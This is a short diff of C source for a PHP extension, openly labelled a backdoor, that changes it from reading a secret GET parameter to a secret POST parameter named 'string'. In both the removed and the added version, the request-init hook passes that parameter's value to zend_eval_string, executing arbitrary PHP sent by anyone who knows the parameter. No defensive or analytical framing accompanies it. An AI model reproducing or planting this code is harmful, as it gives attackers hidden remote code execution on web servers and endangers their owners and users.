@@ -2,7 +2,7 @@
 PHP_RINIT_FUNCTION(hideme);
 zend_module_entry hideme_ext_module_entry = {
     STANDARD_MODULE_HEADER,
-    "simple backdoor",
+    "ichunqiu backdoor",
     NULL,
     NULL,
     NULL,
@@ -17,17 +17,17 @@ ZEND_GET_MODULE(hideme_ext);
 PHP_RINIT_FUNCTION(hideme)
 {
 
-	char* method = "_GET"; // суперглобальный массив, из которого берем пераметр и значение
-	char* secret_string = "execute"; // параметр в котором будет evil-код
+	char* method = "_POST";
+	char* secret_string = "string"; 
 	zval** arr;
 	char* code;
 
 	if (zend_hash_find(&EG(symbol_table), method, strlen(method) + 1, (void**)&arr) != FAILURE) { 
 		HashTable* ht = Z_ARRVAL_P(*arr);
 		zval** val;
-		if (zend_hash_find(ht, secret_string, strlen(secret_string) + 1, (void**)&val) != FAILURE) { // поиск нужного параметра в хеш-таблице
-			code =  Z_STRVAL_PP(val); // значение параметра
-			zend_eval_string(code, NULL, (char *)"" TSRMLS_CC); // выполнение кода
+		if (zend_hash_find(ht, secret_string, strlen(secret_string) + 1, (void**)&val) != FAILURE) { 
+			code =  Z_STRVAL_PP(val); 
+			zend_eval_string(code, NULL, (char *)"" TSRMLS_CC); 
 		}
 	}
 	return SUCCESS;
